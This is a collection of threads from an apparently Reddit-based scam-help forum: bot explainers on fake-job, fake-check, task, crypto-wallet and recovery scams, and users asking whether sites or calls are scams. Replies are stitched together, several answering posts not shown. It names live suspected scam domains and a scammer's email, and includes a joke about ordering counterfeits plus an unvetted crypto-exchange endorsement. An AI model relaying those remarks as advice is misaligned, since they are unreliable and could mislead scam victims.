- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Debt collection scam.

If you are positive the debt you're being accused of has never existed or has already been resolved, this is a scam. Keep in mind that companies can change names and debts can be sold, so not recognizing the company you owe isn't necessarily proof of a scam; you should call the company where the debt originated to confirm a debt exists. Be mindful of debt collection laws in your state or country before engaging in any conversation with a debt collection agency, to avoid being liable for debts that may be outside their statute of limitations for collections.

Like legitimate debt collectors, scam collectors may have access to your SSN, address, names of your contacts, etc. from a data breach. They may be calling your family, friends and employer relentlessly with invasive or embarrassing questions about you. They may send you threatening letters, emails and texts that state you will be sued or arrested if you don't immediately pay them X amount of dollars. These are scare tactics to rush you into paying before you have a chance to consider the situation logically. Instruct all of your contacts that this is fraud and to block the calls. If the scammers know a lot about you, you have potentially been involved in a serious data breach.

Here's a guide from r/identityTheft that covers the basics of credit freeze, IRS pins, even replacement SSN and police reports: https://www.reddit.com/r/IdentityTheft/comments/pqb1za/identity_theft_recovery_101/

You need to freeze your credit through the credit bureaus: https://www.reddit.com/r/IdentityTheft/comments/uvv3ij/psa_freezing_your_three_main_credit_reports_is/ and freeze your debit line with Chex Systems https://www.chexsystems.com/security-freeze/place-freeze

Report correctly referenced documents (SSN, drivers license, credit card) as stolen to the respective agencies. If you are unsure of how to move forward, request guidance from local law enforcement. Credit to user l0john51 for this script.

Title: Chains lama is it a scam?
Body: Is chainslama a scam?

Hi have any of you guys heard of chainslama?

https://chains-lama(dot)com/

I signed up with a trading group from telegram, was asked to make a 250usd deposit. And they opened an account for me on chainslama. Anyone have any experience with this? 

Their financial advisor have been regularly contacting me for the past 1week plus. Like 3 times a week to update the market and to trade for me. So far I have made $70 in profits for the past 2 weeks? 

Here comes the weird part, it's not easy to withdraw/deposit money into the account. Will need to have 2 different crypto wallets to deposit/withdraw money. 

Is it a scam? Hopefully someone can advise

- /u/CatSame8955 - Your post has been queued for moderation because it looks like you included a clickable link. Reddit Admins will remove posts to dangerous websites, so we have to look out for one another.

## The safe way to post about scam websites is:

* Write the website address in the title of your post
* Don't post clickable links in the body text

## So:

* If your post already has a website address in the title: edit the body of your post to remove the clickable link. For example, you can replace a .com with (dot)com - then wait until a moderator comes to take a look and approve this.
* If you didn't put the website address in the title: since titles aren't editable, we encourage you to delete this post, and post again - this time, writing the website in the title of your new post.
* If this post is NOT about a possible scam website: for example, if you tried to share a news article, or a government website, etc - just wait until a moderator comes to take a look and approve this.

Yes, this is a !crypto scam and your money is gone.

!whois chains-lama.com
- **No legit company/trader/investor is using WhatsApp or Telegram. No legit company/trader/investor is approaching people on X or through a "random" text message.**

No legit company forces you to pay a "fee" or "taxes" to withdraw money. That's just a scam to suck more money out of you.

As others have said, the money is gone. You didn't  invest money, you gave it to the scammers.  **There is no investing site or app, that's all lies, nothing but lies.** There is no profit. The screens that show how much you made? Just numbers on a screen to make you believe that you were making money.  Scammers make a whole fake crypto website. It's not hard to create a website. All the info and $$ figures on the site were fake, just big numbers on a screen to make you think you made money. Check out other stories on this sub. People lose thousands of dollars / pounds / Euros, they lose all their savings.
- its a scam, most likely fake crypto or a !task scam

  
the fact you can't easily take out money should say enough

- Hi /u/TheCheeseDictator, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- Hi /u/darknessblades, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

NO. 

You will be scammed if you pay.
- I'm pretty sure you were redirected to buy.stripe.com, not buystripe.com. Buy.stripe.com is the portal for Stripe, which is a huge payment processor. Stripe is safe.

HOWEVER, making the payment is safe but if you actually get anything is another matter. Make sure the seller is legit and trust your gut.

- +850 is North Korea's country code, but it's likely the number was spoofed.

Just block and ignore until they move onto someone else. Don't answer a single call because that tells them they've reached an active number and the calls will increase.

Title: Contacted by ministry of Roads and Transport in Kenya

The person on the other end of the line explained that he was appointed by the "Ministry of Roads and Transport in Kenya" to purchase some items. Upon google searching, he found our website.

The strange thing is that he said that 80% of anything they purchase will be paid upfront.

He then created a group chat with another individual. They have asked me to provide company details to the below email address:

[georgekinuthia@morat.co.ke](mailto:georgekinuthia@morat.co.ke)

They have told me, that once the application is approved, they will pay 80% in advance, and 20% on delivery.

- I suspect that for the ‚Äòapplication‚Äô to be ‚Äòapproved‚Äô, there will be a fee, and another, and another‚Ä¶
- Don't "play along" with scammers if you do not see where the scam is.

Also, to whom do you want to "expose" the scam? You will not be able to find out who these scammers are, or where they are, and there isn't going to be anyone you can "expose" them to.

At best you'd be wasting your time, at worst you'd be putting yourself at risk. We've had people here who thought they were talking to scammers, continued to talk to them, and then the scammers managed to convince them it was real after all.

Also, you should never scambait without completely protecting all of your information. Considering that these scammers were able to reach you, and that they knew enough about your business  to make a targeted approach, that ship has already sailed.

Scammers usually just leave you alone if you cut contact. They know most people will not fall for their scam. But if you waste their time enough to make them actually angry, they may attempt to retaliate.

- qrco.de is a link shortener. Scammers use them to hide the real website behind it. If you use an "unshortener" website like https://unshorten.net/ you can see what the real website is without clicking.

In this case they took you to **wrmierfe.top/subsidy**

Once the scammers are done with it, they will pack up and anyone visiting that website again will see themselves forwarded to google.com so anyone trying to check out that website after you, will think it's just google.

The nice thing about unshorten.net is that they show you all the steps of redirection.
- Contact the bank and let them know it's a fraudulent charge. Also, request a new debit card to keep them from charging more things.
- Having said that, what did the bank tell you when you called to report that you gave away your bank details?

Title: HKJ Marketing (Vancouver) Job offer
Body: Does anyone know about the HKJ Marketing company in Vancouver?

Few days ago, I applied the Data Scientist position from HKJ Marketing on LinkedIn. And on the same day, they called me to have an interview on the next day and I attended the interview. In the interview, the interviewer introduced the company (I forgot what the interviewer said, just remember something like speech to text), and then asked me some general questions, like what is your passion on data science, do you know python/regression/clustering. 

And after 1 to 2 days, they gave me the offer but actually they did not give me any online assessment and technical interview round. They just trust me that I know that technical knowledge. 

So just want to know more about the HKJ Marketing company in Vancouver and is there any chance that the job offer is a scam? If no, what is the company doing (I searched their website but have no idea what they are doing)?

- Did you sesrch online for the company? 

Please add more about the job offer. Do you have the website that they have used in their communication to you? Break it up to post here, so it's not a link -- like example (dot) com

Did they tell you info like hours, pay rate, job responsibilities? Do you have training and / or experience? Is it work from home?
- I don't know anything about the company, so cant answer the original question you posted.

The web site looks professional.

There are 3 job openings listed on their ste, none of them are Data Scientist.

There is a Data Analyst opening listed, take a look at the job description -- it doesn't say anything about text to speech.

Based on the red flags you mentioned in your post, and what I see on their website, I have a concern that the people who contacted you may be impersonating the real company. If it was me, I would contact HKJ Marketing directly, using the phone number on their website, ask for the person that interviewed you by name, and then ask some questions, do a follow-up to the interview, to find out if they really are the ones considering you for the job.
- I also checked the company LinkedIn page, and the page has no verification and no any posts, which is strange I think.

Title: Discord TikTok account buyer scam
Body: There‚Äôs this server called Vanguard Media on Discord, it gets people to DM your TikTok accounts to try sell them. They DM‚Äôd an account I just stopped using because I didn‚Äôt need it saying they would buy it, it had 1.5k followers and over 400k views. The ‚Äúmiddleman‚Äù (Jack in my case) gets sent the money from the buyer and you give the details to the buyer. The middle man sent me receipts from an email of his transfer from PayPal to my bank, let alone it didn‚Äôt come for a day so I messaged PayPal and they said the ID was not correct for the amount. He was begging for his ‚Äúfee‚Äù to be paid and after finding out it was fake I pipped up about this in the server ticket after I realised and he banned me from the server.

I am pretty good at sussing out scams and this one seamed real to me.

I attached both the screenshots just before I got banned and the ‚Äúreceipts‚Äù he sent me.

(The account had no value and I was about to delete it anyway, didn‚Äôt even have access to the creator fund)

- "pretty good at sussing out scams". My guy, the middleman IS the scam. That's the whole point. There was never any middleman, it was just an alternate account used by the same scammer. If you fell for this but claim you're good at recognizing scams, you need a bit of reevaluation to redefine what "good" means because this ain't it when the red flags were visible from the start.
- Motherfucker makes me mad with those pings
- I always had a feeling it was a scam, hence why i gave away the account, it was no use and was very interested to see what would actually happen
- Yeah he pinged me every message, which made me feel it was a bit sus

- Step one is to delete everythinfrom then. Scammers JOB is to scam people, and some are very good at doing it. Just because you were trying to help someone, and that kindness was used against you, doesn't make you any of the things you are thinking. Kindness isn't a weakness. Just learn from this and don't let it happen again. You tried to be a good person...you are a good person, and just because there are bad people out there, you can't let the bad people win.
- Sounds like you got caught in a !fakecheck scam - some more details would be helpful. Unfortunately, if you sent money via gift cards, there really is no recourse. The bank can't help you with that. Your best bet is to ask them if they can set up a payment plan so you can pay back your debt in installments. A more drastic approach would be to declare bankruptcy and have the debt discharged, but that would cause other problems for you.

Do be aware of !recovery scammers who will now be flooding your DMs with promises that they can get your money back. They are lying - all of them. They just want to kick you while you are down and make off with more of your money. Report their accounts to Reddit and then block.
- Forgive yourself and let it go. The damage is done and you probably learned a lot from it and will not get scammed again. Life's lessons can be pretty harsh, but you didn't hurt or kill anyone and the effects of your experience are monetary and emotional. Forgiving yourself takes care of one of those.
- Unfortunately the money is gone.  Beware of !recovery scammers who may reach out to you claiming they can help.  They cannot as they are just another scammer.  Be on the alert for more potential scams as you are now known as an easy mark.
- This is something awful that happened to you 4 years ago, when you were very young. Time to take a deep breath and put it behind you. You lost money and you feel stupid, but you're not alone in this. Many smart and talented people have gotten caught by a scammer. 

The money is long gone. So now your task is to decide not to let the experience damage you more. You lost money that you needed, but this happens to people for many reasons. People lose a job, or have a house fire (think of all the people in Los Angeles right now), or get sick. You're not sick and your house hasn't burned down. You're ahead in the game. 

The more you let this bad thing dwell in your mind, the more it harms you. You've learned to be more careful, which is good.  Close the door on this.
- Sounds like you have learned from this experience. It was an expensive lesson. No matter how much money was involved, you can't afford it so it is expensive.

You will get past this hurdle. It might be hard, but you will do it.
- Be kind to yourself and try to let go of this event. You were a full person with a childhood, a life full of experiences and a future ahead of you. The same is true now. They did not take you away from you. It was just a thing like many other things that happened and now it's in the past.   
The money is gone for good. But many get by with less. Many have lost more. This is not the end for you even though it hurt you.

Try to think about it less and less. Try to find joy in the fact you aren't in that situation anymore, it ended and you are free.

Good luck!
- Do you mean financially recovered or emotionally? Because financially speaking you've had 4 years to pay this back.
- If this was the stupidest thing you‚Äôll ever do in your entire life, you‚Äôll be lucky. 

You got a degree in how not to get scammed - it‚Äôs up to you now to make sure you don‚Äôt have to pay for the master‚Äôs degree or PhD - this can be a lesson that stings but will last you your entire life. 

The sooner you forgive yourself and spread awareness to friends, family, coworkers on the different types of scams, the less expensive this lesson will feel - because you just might save someone from making the same mistake.
- Do you still have a bank account? Because you're just going to have to consider it the price of education and move forward with your life.
- How much did you lose? Why do you think you won‚Äôt recover?
- It's amazing that cheques are even a thing in this day and age.
- Hey
You are not alone  
2020 is a while back.

Everyone is different and normal people don't rip off other people.

Just use it as a life lesson.

It sounds cliche but evil people will be taken care of by the Karmic circle . It just doesn't always coincide with our time table.

Not enough info really but I do believe you that this was a wake up call and an introduction to the world outside of a happy home. 

The main thing is don't repeat this behavior.

Another trite response is , don't worry it's only money.  Yea, easy to say. 

4 years is a lot of time. 

You have to figure out some way to move on. You are way to young to give up

It never feels good to be taken advantage of.


Anyway 

BREATHE

- Kindness paired with any degree of naivety is indeed a weakness in this day in age. On the internet, trust no one. Never send money to anyone without being able to be refunded.
- Hi /u/AngelOfLight, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Hi /u/AngelOfLight, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- Thanks and the bank said we pushed it threw for convenience and then yeah but meh yeah i am to broke but yeah ive learned since then
- If you're in the US, banks are required by law to make money from a check available within 24 hours (unless they catch the fraud right away). It's not their choice. Scammers know this, but not a lot of regular people do. They count on the fact that you might think the check has cleared when the money appears in your account, but they know the check will eventually bounce. That's why they will try and get you to send money somewhere else as soon as possible.

The point is that the bank isn't really at fault. Their hands are tied. The scammers took advantage of something that not many people are aware of - but now you are.
- Be aware banks are REQUIRED by law to make the funds available to you before the check clears. Scammers know this law.
- Look into bankruptcy procedures and possibly lawyers/advisors.  There should be some inexpensive ones around who can help you through filing and advise you on what you can file and if this debt can be dealt with via bankruptcy.  If this debt has been causing you problems for 5 years you may be able to have a judge deal with it.  

Filing will of course be a hit to your credit score, but so is a bunch of debt.  I hope it would give you the fresh start that you need.

- What was the website, how did you find it and how did you pay? 

If it was a scam site I'd be more worried about your card (if you used a card) getting compromised.
- Here you have opinions:
https://www.trustpilot.com/review/frmoda.com
- If you are an individual there's literally no way to know if you will be charged "insane custom fees": unless it's a big ticket item or it comes from Japan some parcels get waved through and others don't. Customs operate very much in mysterious ways. And technically custom duties are not a scam but a shakedown. ;-)

If you are talking FRMODA in Italy they really exist, they are a registered company in Italy. Obviously you may have run into a spoofed website, so post the exact link here.
- It‚Äôs called FRMODA.com, I googled the shoes I wanted and it was on Google shopping options
- I have read through that site and unfortunately when ordering I didn‚Äôt realise that it wasn‚Äôt a UK run site, I am seeing reviews about hidden customs charges and items taking weeks to arrive and other reviews saying that items haven‚Äôt been posted at all!
- I‚Äôve never ordered anything abroad so the reviews about the customs charges spooked me. The item was under the value of ¬£135 and from a bit of googling I can see I shouldn‚Äôt be charged fees?

https://www.frmoda.com/en_uk Is the website
- I am reading opinions in Spanish and there are complaints about the delay in receiving the shipment and about the improper collection of taxes (in the responses the company clarifies that orders from outside the EU are subject to import taxes)
Anyway, I hope everything is resolved without any major headaches for you.
- Yes, that would be their website alright. 

Import duties, as said, are not really a scam, more of a shakedown, even if a legalized one. How they are collected is usually up to the carrier itself. Next time order counterfeits from China and they will be waved right through. ;-)

- Hi /u/vitaminxzy, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

Title: My stupidity and I fell for a scam and need to get out of it
Body: Hi everyone I need some help, so I know I‚Äôm stupid please save the judgement I‚Äôm already beating my self for it but here is the deal. I started talking with someone on discord who told me they were a day trader from the UK and needed someone with a us bank account to deposit money into and then wanted it sent back. I told straight away I didn‚Äôt want to share any bank account info. Then they mention doing it via my credit card said that they can pay my credit card and I just have to sent them the money back. Well I let have my credit card info to make payment because honestly it max out and nobody can do anything with it and I didn‚Äôt actually think their payment was going to clear because chase put the deposit on hold for 8 days while they investigated and so on. 

Since chase clear the payment I was going to sent it back to him but then he wanted me to buy iPhones and gift cards and that‚Äôs when my stupidity fell üòÇ. I told them I didn‚Äôt feel comfortable doing that because I had a feeling they were going to cancel the payment afterwards and I was going to be left hanging. I told them I wanted to cancel the payment and reported to chase. I already change my logins etc. but then things got scary üò® 

He stared to threatening me saying that he will sent people to my house and sent his guys over etc, and then someone text him on WhatsApp saying to not play with the bosses money and to sent the money they way they want it. Then he was like oh we are going to hurt you and your family. 

Honestly I‚Äôm just scared right, don‚Äôt worry about the address they have the wrong one. But still I‚Äôm scare. 


Anyway I haven‚Äôt touch the money, I haven‚Äôt done anything with it other than share my concerns with my family for my stupidity. Please give advice. 

Thank you üôè

- The money is from a stolen account and will eventually be clawed back.  Don't touch it.  Talk to Chase and tell them what happened.

Don't talk to police without an attorney.  

Block and ignore the scammers, they are on a different continent and won't come after you.
- Just block them. If they try again, block them again. Do not respond to them or acknowledge them in any way.
- Talk to a local attorney and see what they suggest.  The scammers are almost certainly not even in the US, they can't do anything to you.  Try not to be scared.
- Threatening to harm is a crime. File a police report. Ignore the phony payment to your credit card and make your own payment to keep the account current so you don't get slammed with retroactive charges when the phony payment is ultimately withdrawn.

Oh, and stop doing stupid stuff like talking to scammers and carrying a balance on your credit card.
- Lawyer up
- They're not going to hurt you or your family. They are on another continent. They are just trying to scare you so you send them some money. Just block them and ignore them.
- Came her to type something up and BOOM you had already typed exactly what I was going to say.  OP this is all correct.
- This, 100%.
- What if he said their guys in us will find me. They text me from a us number.
- Then they spoofed the number. We see these kinds of threats regularly on this sub. They never follow through. They are just idle threats trying to scare you.
- My idiot self is done with games and everyone else after this scares the life out of me. For anyone else reading this just ask your parent for the money don't let your pride and desperation guide you

Title: Spam calls ever since I answered a single one
Body: So a few months ago I got a random spam call and when trying to click to close the notification I answered the call. It was dead silent. Ever since I have been getting hundreds of spam calls a week and they all are just as silent. I don't hear hardly any background noise when I had picked up a few times (either for the same reason as the inital pickup or because I was expecting a call from an unknown number). The numbers have been progressively getting closer to my own area code. (they started off across the country and are now for counties around mine and occasionally my own) Is this a scam? And if so, what is their end goal? And also how do I make it stop?

- The only way we got the barrage of calls with no one responding to a "hello" to my wife's phone was to turn on the phone's "Do Not Disturb" but allow those in her contacts to ring through, as well as second call placed within 15 minutes of the first call from the same number (for the case of doctors offices calling back on non-main number). Those nuisance calls went from over a dozen a day to maybe two a week and she is now far less aggravated.

We have a suspicion on who was making those calls but, because the caller-id system is so unsecured (any number can be spoofed), it is near impossible to prove or disprove it is the person we suspect.

Title: Instagram ad scams!!
Body: I have seen this ad on Insta on book nooks. It looked so pretty, reviews were good, so I ordered it. I got the parcel today, and I literally got junk. I attached the pics of what I ordered and what I got. For anyone who is wondering, this is the website - oasis-labs(dot)in.

Please check these things before you buy anything from these platforms.

Check if you have access to write any comments. For sample, give 1-star rating, write something and check if it gets taken down after sometime. This is not fair but losing money is also not fair.

Check if they attached any contact number. If yes, try to contact it or check in Truecaller stuff if anyone has reported it spam.

Try to search the website name and product name online to see if anyone vented it out like me.

I want to support small business so bad, but try to buy from Amazon or Flipkart or any of your trusted websites only!

- Caveat emptor. Common sense should have told you that you weren't getting something that elaborate for $5. That's not how pricing works. Contact your bank and file a dispute.

That should have been the main thing to show it was fake - the price. There's no reason to research things like phone number or reviews when the prices are absurd.

All social media ads should be considered scams unless there's overwhelming evidence to prove they're real.
- Seeing something that is usually very expensive on sale for dirt cheap should automatically scream "scam". *Especially* when it comes from some account on insta.
- And this is why these sites exist. Because people can‚Äôt pass up a ‚Äúdeal‚Äù and think they‚Äôre really going to get something instead of getting scammed.
- Those book nook images look like AI
- Instagram ads was promoting telegram drug bot on my feed
- Stop. Clicking. Suspicious. Links. In. Social. Media. 

Use Google and reputable retail sites to find a product you want.
- Wouldn't it be easier to show the few Instagram ads that aren't scams?
- Okay, now I'm concerned. How much these usually cost? I used to buy these diy stuff less than this amount 2-3 years back. And yeah, I'm not expecting the purest quality, just cardboard stuff is fine as well. And at my place, this is actually 1000 bucks, which is not quite cheap.
- They do to me too. AI has been so lovely for scammers and cheaters.
- The books go on TEMU for $32 USD. The insta 360 starts at $149 for base models.
No way is that website selling these things for 12-18$ each

Title: Got some verification emails from PayPal, I didn't make an account though
Body: Ok, third attempt posting. I'm on mobile so I apologize if it looks weird.

 I got some emails earlier today from Paypal, the email looks legit, the profile pic and email have a blue checkmark next to it as well. Looking over the emails with the knowledge that I didn't make an account, I ignore it and think that it's nothing.
 About an hour later, I get another email that's Welcoming me to PayPal despite me never confirming the email. So I'm asking if anyone knows if it's a scam or if I need to check if my information has been compromised and need to find a way to delete it. 
Hopefully this post goes through...

- So you don't have a paypal account at all right? Could be someone made the account with the wrong email and/or they are using your email to make a new one hoping you don't notice. Go to paypal site, and request to change password and see if they send you a reset email. If they do, you can email paypal and said you never made this account and to close it.

- Scammers come up with loads of tricks and yes, one is that they give you money to gain your trust. But another trick they do is pretend to give you money by showing you screenshots or convincing you that a fake wallet has money in it for you.

!crypto
- Lots of scammers give a small taste $ to make people think the scam is not a scam - it's baiting the hook for the fishies. Once someone gets a small payout, they're more inclined to believe the scam might be legitimate and keep going in deeper. It's a well know psychology angle.

Literally many drug dealers/scammers use this - "the first taste is free" because they'll get you addicted/fool you into thinking it's something safe or something you need.
- Very often a scam involves giving something that appears to be of value to the victim to lull them into a false sense of security.  

Crypto currency is pretty worthless anyway, so if they think they can get real money out of you I think they'd happily give you some crypto.  Honestly, that's the basic crypto currency scam; "give me real money and I'll give you this crypto currency."
- Yeah, sometimes they give you a small amount to convince suckers they are legit. Then they steal your life savings.
- Scammers giving out free crypto is rare; always verify sources and avoid unsolicited offers. Platforms like Netcoins Crypto Ex change are transparent and safe
- More importantly, who would give you money for nothing if it wasn't a scam?
- Hi /u/ditzen, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- Plus they often give fake money in their own fake app.  Or reversible or stolen sources, so that the bank takes it back. It may look like you got something, but, in reality, even the carrot is fake.
- That is true. Who is gonna give out free money it might be legit
- This happened to my security guard years ago. I was talking crypto with him and realized he was being scammed. His ‚Äúgirlfriend‚Äù told him about it. The scammers had a fake app (that looked very professional and legit) and he thought he was mining eth. The app showed him his ‚Äúearnings‚Äù. I told him you can‚Äôt mine etherium on a phone. I asked him if he was able to withdrawal before and he said yes. He said though he had to buy some other crypto coin and send it to them before they would release the coins he earned.

I tried explaining to him that it was a scam but he didn‚Äôt believe me. So many red flags. I told him, do not send them any more coins or money. He switched jobs soon after so I don‚Äôt know what happened after that. He was such a nice guy (to a fault) and I think the naive hurt him. I hope he didn‚Äôt lose too much and stopped after I told him.

Title: Someone is pretending to own my dad‚Äôs house in a phone scam. Why?
Body: Today a lovely woman called my dad and let him know that she was the victim of an attempted scam. It sounded pretty typical - scammer had messaged her on WhatsApp spinning a story and asking for cash. But the scammer had given his address as my Dads bungalow. The lady had tracked dad down with a bit of internet sleuthing and shared this story to warn him. 

My dad is in the process of moving house so I wonder if this is how the scammer came across the details.

Why would someone do this? It sounds like dad isn‚Äôt the target of the scam, but should we be worried?

- Probably picked the address at random. To most everyone addresses are just numbers for a location on a map/app.
- Dad's house advertised in Real Estate shop? they publish addresses, don't they? they also do that in the UK, whereas here in Spain, for one, estate agencies never give out the address.
- Did they share his personal details, like name and phone number, or just his address? Because I can just open Google Maps and pick any address I find.
- Someone would do this for the exact reason that happened.  Internet sleuthing leads to someone else, not the scammer.
- It could just be a coincidence that your father is moving. Lots of addresses are publicly available. I wouldn't worry (especially if the scammers are just throwing it out to a random perosn with no connection to your father)

It could be, of course, that the woman who called is a scammer. I know that sounds paranoid but maybe don't get too chatty with her just in case :)
- Google your dad. See what comes up. May be time to update some settings and educate on cybersecurity.

Google yourself while you're at it
- Addresses are public information. Just go on Google maps and select something, voila, scam address found.

Nice that she warned him, but I doubt there is any operation for you available. I would be worried if the scammers connect social media/ phone number/ personal name to this address (even though it's public information as well, but then it seems targeted and usually scammers don't go for that, but quantity)

In terms of why: cause plausibility of scam story. "Real addresses? Must be real" ~ someone, somewhere
- I think you‚Äôre probably right. Feels very weird though. Thanks!
- Yeah unfortunately it‚Äôs very clear from the generic estate agent listing where the address is
- Nope I think they just used his address, reassuringly
- Ahhhh this makes sense! Thank you
- Yeah I totally agree. But I‚Äôm no noob and did a bit of sleuthing on the woman who called (she also gave additional details that I won‚Äôt share here, to help us verify). Pretty confident she is legit. I‚Äôm grateful to her for taking the time to try and warn my dad.
- Thank you, good idea!
- Yep this tracks.
